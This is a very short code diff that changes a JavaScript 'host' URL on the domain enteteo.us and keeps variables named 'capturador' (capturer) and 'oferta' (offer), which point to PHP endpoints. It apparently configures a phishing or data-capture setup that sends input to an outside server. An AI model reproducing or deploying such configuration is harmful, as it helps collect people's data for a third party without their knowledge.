@@ -1,4 +1,4 @@
-var host = "https://enteteo.us/cocote";
+var host = "https://enteteo.us/laleche";
 var capturador = "z.php?";
 var oferta = "x.php?";
 
